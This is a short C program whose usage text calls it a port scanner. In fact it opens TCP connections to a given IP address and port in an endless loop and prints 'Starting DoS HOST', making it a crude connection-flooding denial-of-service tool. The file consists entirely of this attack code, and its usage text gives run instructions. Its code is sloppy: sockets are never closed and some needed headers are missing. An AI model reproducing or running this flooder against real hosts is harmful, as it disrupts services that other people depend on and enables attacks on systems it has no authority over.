#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>


int main(int argc, char *argv[]) {

    if(argc <=2) {
        printf("None arguments are given\nRun example: ./portscan IP\n");
    }else {
        int sock;
        int conn;

        char *port;
        char *dst;
        port = argv[2];
        dst = argv[1];
        int x = atoi(port);

        struct sockaddr_in host;
    
        

        while(1>0) {
            sock = socket(AF_INET,SOCK_STREAM,0);
            host.sin_family = AF_INET;
            host.sin_port = htons(x);
            host.sin_addr.s_addr = inet_addr(dst);
            conn = connect(sock, (struct sockaddr *)&host, sizeof host);
        
            printf("Starting DoS HOST: %s:%d\n", dst, x);
        }
    }
}